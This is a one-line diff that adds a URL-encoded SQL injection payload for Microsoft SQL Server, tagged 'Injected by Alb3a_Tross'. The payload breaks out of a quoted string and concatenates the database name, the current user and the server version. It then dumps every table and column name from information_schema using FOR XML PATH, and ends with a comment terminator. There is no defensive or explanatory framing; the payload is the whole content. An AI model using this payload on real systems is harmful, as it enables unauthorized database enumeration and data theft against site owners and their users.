@@ -1,0 +1,1 @@
+' and 1='Injected by Alb3a_Tross'%2b' || '%2bdb_name()%2b' || '%2buser%2b' || '%2b@@version%2b' || DUMP DB ||  '%2bcast((select %2b' || '%2btable_name%2b' ::: '%2bcolumn_name+from information_schema.columns for xml path('')) as char(8000))--+-
